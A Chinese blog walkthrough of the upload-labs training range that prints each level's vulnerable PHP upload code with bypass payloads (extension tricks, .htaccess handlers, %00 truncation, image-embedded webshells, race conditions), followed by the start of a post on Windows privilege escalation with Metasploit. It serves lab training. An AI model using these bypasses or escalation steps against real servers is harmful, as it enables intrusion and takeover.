'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; }} Pass-03tips：本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！ 思路：这里可以使用大小写绕过或者使用.php3 .php4 .php5 .phtml .phtm .phps .phpt .php345等可以被解析为php的文件后缀（前提是服务器配置了将上述文件解析成php文件） 将文件后缀修改为php3，但是这里却无法直接连接蚁剑 分析源码发现这里除了黑名单.asp，.aspx，.php，.jsp文件之外，还将upload后的文件名改为了时间加随机数组合，导致我们无法直接蚁剑连接。 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} Pass-04tips：本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ 思路：这个黑名单太大了，有一个思路是上传.htaccess文件配置将.jpg文件解析成php文件 首先上传.htaccess文件将我们稍后上传的shell.jpg解析成php文件 123&lt;FilesMatch &quot;shell.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 我们先上传带可以回显phpinfo的jpg文件 然后上传.htaccess文件将jpg文件解析为php文件 访问对应url发现回显 Pass-05tips：本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ 思路：它没有将所有大小写组合都过滤掉，所以我们可以传入.PHP后缀的文件。 传入shell.PHP 访问对应url发现回显 源码分析 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} Pass-06tips：本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ 思路：事实上它仍然没有过滤掉大小写的所有组合，但是通过查看源码发现本题考查的是其他的知识点。 分析源码发现没有进行首尾去空 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 我们上传一个.php[空格]文件 访问对应url发现回显 Pass-07tips：本pass禁止上传所有可以解析的后缀 思路：根据提示暂时没什么思路，但是通过对比源码可以发现这里没有对.进行过滤，我们可以通过.php.来进行绕过，这里利用了windows的特性。 传入shell.php.文件 访问对应url发现回显 Pass-08tips：本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ 思路：根据提示暂时没什么思路，但是通过对比源码可以发现这里没有对::$DATA进行过滤，NTFS文件系统包括对备用数据流的支持，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：DATA。 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 我们上传shell.php::$DATA进行绕过 访问对应url得到回显 Pass-09tips：本pass只允许上传.jpg|.png|.gif后缀的文件！ 思路：根据提示暂时没什么思路，但是通过对比源码可以发现这里只对后缀名进行了一次.的删除，于是考虑点空格点绕过。 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 传入shell.php. . 访问对应url得到回显 Pass-10tips：本pass会从文件名中去除.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符！ 思路：这里可能是做了字符串替换，所以考虑可能可以双写绕过 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 传入shell.pphphp 访问对应url发现回显 Pass-11tips：本pass上传路径可控！ 思路：上传路径可控，但是我们不知道该如何利用，查看源码发现我们可以控制存储路径，由于是白名单而我们又必须解析为php文件，这里考虑使用%00截断，将%00后的.jpg截断 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; }} 将存储路径修改为../upload/shell.php%00.jpg，apache对%00后的字符不会进行解析，相当于我们将其保存为了php文件 访问对应url发现回显 Pass-12tips：本pass上传路径可控！ 思路：和上题利用方式类似，差别在于POST和GET的区别 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传失败&quot;; } } else { $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; }} 首先写入截断语句../upload/shell.php[空格].jpg 然后在Hex中将空格对应的hex值改为00造成%00截断 访问对应url发现回显 Pass-13tips：本pass检查图标内容开头2个字节！ 思路：只检查开头两个字节，那就改为对应的就好了 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType;}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} 传入一个png图片进行测试，后面跟着一句话木马 然后根据文件包含漏洞查看是否被解析，可以看到回显了 传入一个文件前两个字节为255216的图片马，我们将刚才的修改一下即可 然后根据文件包含漏洞查看是否被解析，可以看到回显了 传入一个文件前两个字节为7173的图片马，我们将刚才的修改一下即可 然后根据文件包含漏洞查看是否被解析，可以看到回显了 Pass-14tips：本pass使用getimagesize()检查是否为图片文件！ 思路：getimagesize()检查的是文件头，例如GIF文件的GIF89A。这关还是老老实实做图片马，找三种图片将一句话马嵌入就可以了，不能像pass-13那样只改两个字节了，需要完整的文件头，其他的不赘述。 12345678910111213141516171819202122232425262728293031function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} Pass-15tips：本pass使用exif_imagetype()检查是否为图片文件！ 思路：exif_imagetype()读取一个图像的第一个字节并检查其签名，如果发现恰当的签名返回一个对应的常量，否则返回false，我们也是采用制作图片马的方式来绕过检查。 1234567891011121314151617181920212223242526272829303132333435function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }} Pass-16tips：本pass重新渲染了图片！ 思路：二次渲染是将我们上传的图片在服务器重新生成图片，由于我们的图片马本身就包含一句话木马，于是仍然可以通过文件包含加上图片马的形式进行解析。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else{ $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; }} Pass-17tips：需要代码审计！ 思路：需要通过条件竞争进行木马的访问，在服务器将php文件unlink删除之前他会对其进行move操作，所以会暂时存在于服务器上。 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = '上传出错！'; }} 设置burpsuite反复向服务器发包 设置payload为空 发包情况 在浏览器中反复刷新，发现可以访问到shell.php Pass-18tips：需要代码审计！ 思路：通过源码看到它同样存在条件竞争的利用，我们可以像之前那样通过短时间大量发包来实现访问临时文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//index.php$is_upload = false;$msg = null;if (isset($_POST['submit'])){ require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) { case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; }}//myupload.phpclass MyUpload{.................. var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir ){ $ret = $this-&gt;isUploadedFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;setDir( $dir ); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkExtension(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkSize(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 ){ $ret = $this-&gt;checkFileExists(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 ){ $ret = $this-&gt;renameFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); }.................. }; Pass-19本关卡需要Linux环境暂时不复现 Pass-20tips：来源于CTF，请审计代码！ 思路：通过查看源码可以发现$file_name经过reset($file) . '.' . $file[count($file) - 1];处理。 如果上传的是数组的话，会跳过$file = explode('.', strtolower($file));。 并且后缀有白名单过滤： 12$ext = end($file);$allow_suffix = array('jpg','png','gif'); 而最终的文件名后缀取的是$file[count($file) - 1]，因此我们可以让$file为数组 $file[0]为shell.php/，也就是reset($file)，然后再令$file[2]为白名单中的jpg。 此时end($file)等于jpg，$file[count($file) - 1]为空。 而 $file_name = reset($file) . '.' . $file[count($file) - 1];，也就是shell.php/.，最终move_uploaded_file会忽略掉/.，最终上传shell.php。 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = &quot;禁止上传该类型文件!&quot;; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; } } }}else{ $msg = &quot;请选择要上传的文件！&quot;;} 文件名传入save_name[0]=shell.php/ save_name[2]=jpg 数组 访问对应url发现回显 总结重新刷了一遍uploadlabs靶场，巩固了文件上传的利用方式，这里引用靶场仓库的一张导图作为结尾。","link":"/2023/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B7%A9%E5%9B%BA/"},{"title":"权限提升","text":"提权概述提权，网络术语，提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL权限以夺得该服务器权限。 Windows：user –&gt; administrator Linux：user –&gt; root 提权条件 拥有webshell、普通用户权限 拥有某些软件的账号密码 本地或远程服务器上存在漏洞 拥有漏洞利用工具代码 操作系统内核漏洞提权介绍利用window系统中没有打补丁的内核溢出漏洞进行攻击。 1.查看当前用户权限 1whoami /groups 2.查看系统安全补丁 12systeminfowmic qfe get Caption,Description,HotFixiD,InstalledOn 3.与可以进行提权的内核溢出漏洞exp进行对比 https://github.com/SecWiki/windows-kernel-exploits 4.执行EXP 实战演练 利用其它漏洞获取一个shell，查看权限为普通用户 1meterpreter &gt; getuid 12meterpreter &gt; shellwhoami /groups 使用post/multi/recon/local_exploit_suggester进行提权漏洞检测 我们可以选择一个漏洞进行利用例如MS_2018_8120进行利用 配置好参数后run，查看系统当前权限为SYSTEM权限 